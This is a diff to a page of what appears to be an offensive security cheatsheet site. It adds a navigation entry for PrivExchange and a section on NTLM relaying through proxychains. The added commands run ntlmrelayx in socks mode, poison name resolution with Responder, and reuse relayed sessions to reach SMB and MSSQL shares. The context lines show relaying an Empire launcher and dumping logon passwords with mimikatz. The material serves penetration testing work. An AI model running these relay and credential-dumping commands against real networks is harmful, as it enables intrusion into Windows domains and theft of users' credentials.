@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:25 CET">
+<meta name="revised" content="2019-11-10T13:28:45 CET">
 <title>Out of Domain (No credentials) :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1021,6 +1021,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1438,6 +1445,30 @@ ntlmrelayx.py -tf targets.txt -c &lt;insert your Empire Powershell launcher here
 <span style="color:#75715e"># Then you can pop an interactive shell</span>
 <span style="color:#75715e"># And use for example mimikatz</span>
 mimi sekurlsa::logonpasswords</code></pre></div>
+<p><br/></p>
+
+<h3 id="ntlm-relaying-and-proxychains">NTLM Relaying and Proxychains</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using socks settings in case of multiple sessions to handle</span>
+<span style="color:#75715e"># you can specify a target like this all://10.1.2.10</span>
+<span style="color:#75715e"># It will target smb://’, ‘mssql://’, ‘http://’, ‘https://’, ‘imap://’, ‘imaps://’, ‘ldap://’, ‘ldaps://’ and ‘smtp://’</span>
+./ntlmrelayx.py -tf /tmp/targets.txt -socks -smb2support
+
+<span style="color:#75715e"># HTTP and SMB are OFF in Responder.conf</span>
+responder -I eth0 -rv
+responder -I &lt;interface&gt; -r -d -w
+
+<span style="color:#75715e"># If someone connects and is relayed</span>
+<span style="color:#75715e"># You can see sessions</span>
+ntlmrelayx&gt; socks
+
+<span style="color:#75715e"># To use sessions, proxychains can be set up</span>
+<span style="color:#75715e"># /etc/proxychains.conf must be pointing toward the target host</span>
+
+<span style="color:#75715e"># Then you can use different tools to interact</span>
+<span style="color:#75715e"># For example, connect through SMB</span>
+<span style="color:#75715e"># If password asked, whatever</span>
+proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1
+proxychains ./mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth</code></pre></div>
 <p><br/></p>
 
 <h3 id="snmp-communities">SNMP Communities</h3>
